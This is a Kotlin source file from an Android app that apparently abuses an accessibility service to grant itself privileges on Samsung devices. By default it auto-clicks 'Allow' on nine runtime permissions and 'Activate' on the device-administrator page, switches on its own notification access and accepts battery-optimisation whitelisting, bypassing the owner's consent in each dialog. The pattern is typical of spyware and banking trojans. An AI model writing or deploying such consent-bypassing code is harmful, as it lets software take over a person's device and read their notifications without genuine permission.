package com.zaka.screenagent.flow

import android.util.Log
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.perm.PermissionClicker

/**
 * 三星 / 通用流程 —— 与 3.3 的行为完全一致，没有改动：
 *
 *   ① 申请 9 项运行时权限（自动点「允许」）
 *   ② 设备管理员：打开激活页 → 自动点「激活」
 *   ③ 通知使用权：跳设置页 → 点自己那一行 + 开关
 *   ④ 电池优化白名单：系统框点「允许」
 *
 * 后三步由 AdminActivator → NotificationAccessActivator → BatteryOptimization 内部接力，
 * 这里只负责"起头"和把 chainToNotification 打开。
 */
object SamsungFlow : VendorFlow {

    private const val TAG = "Flow(Samsung)"

    override fun start(service: BoundaryAccessibilityService, noAutoClick: Boolean) {
        Log.d(TAG, "start: perm -> admin -> notification -> battery (3.3 behavior)")
        com.zaka.screenagent.admin.AdminActivator.chainToNotification = true
        com.zaka.screenagent.admin.AdminActivator.attach(service)
        com.zaka.screenagent.admin.AdminActivator.autoclick = !noAutoClick
        com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !noAutoClick
        if (!noAutoClick) runCatching { PermissionClicker.start(service) }
        service.requestRuntimePermissions()
    }
}
